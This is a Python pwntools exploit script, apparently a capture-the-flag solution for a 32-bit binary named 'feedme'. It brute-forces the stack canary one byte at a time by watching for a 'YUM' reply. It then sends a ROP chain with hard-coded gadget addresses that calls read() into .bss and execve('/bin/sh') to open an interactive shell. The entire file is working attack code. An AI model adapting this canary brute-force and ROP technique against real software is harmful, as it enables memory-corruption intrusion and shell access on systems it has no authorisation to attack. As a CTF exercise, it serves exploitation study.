from pwn import *
import binascii

HOST = '127.0.0.1'
PORT = 4000

local = True
canary = ""
def canary_bruteforce():
    global canary 
    for i in range(0,4):
        for j in range(0x00,0xff):
            trybyte = chr(j)
            msglen = binascii.unhexlify(hex(32+len(canary)+1)[2:])
            s.send(msglen + "A"*32 + canary + trybyte)
            data = s.recvuntil('FEED ME!\n')

            if "YUM" in data:
                print data
                canary += trybyte
                log.info("Found : "+hex(j)+", Canary : "+repr(canary))
                # print "canary len : ",len(canary)
                break

if local:
    s = process("./feedme")
else:
    s = remote(HOST, PORT)

e = ELF("./feedme")

#gdb.attach(s)

"""Here we go.
"""
s.recvuntil('FEED ME!\n')
canary_bruteforce()

pop_eax = 0x080bb496       # 0x080bb496: pop eax; ret;
pop_edcbx_ret = 0x0806f370 # 0x0806f370: pop edx; pop ecx; pop ebx; ret;
int0x80 = 0x0806fa20       # 0x0806fa20: int 0x80; ret;

ex = "A"*32
ex += canary
ex += "B"*12

# read(0, e.bss(), 0x8)
ex += p32(pop_eax)       # pop eax
ex += p32(0x3)           # number of systemcall sys_read
ex += p32(pop_edcbx_ret) # pop edx/ecx/ebx
ex += p32(0x8)           # size of stdin
ex += p32(e.bss())       # buf for stdin
ex += p32(0)             # fd of stdin
ex += p32(int0x80)       # invoke system calls in Linux on x86

# execve("/bin/sh",NULL, NULL)
ex += p32(pop_eax)       # pop eax
ex += p32(0xb)           # number of systemcall sys_execve
ex += p32(pop_edcbx_ret) # pop edx/ecx/ebx
ex += p32(0)             # third argument of execve : NULL
ex += p32(0)             # second argument of execve : NULL
ex += p32(e.bss())       # first argument of execve : buf
ex += p32(int0x80)       # invoke system calls

s.send(chr(len(ex)))
s.send(ex)
s.send("/bin/sh\x00")
s.interactive()

# interactive
s.interactive()
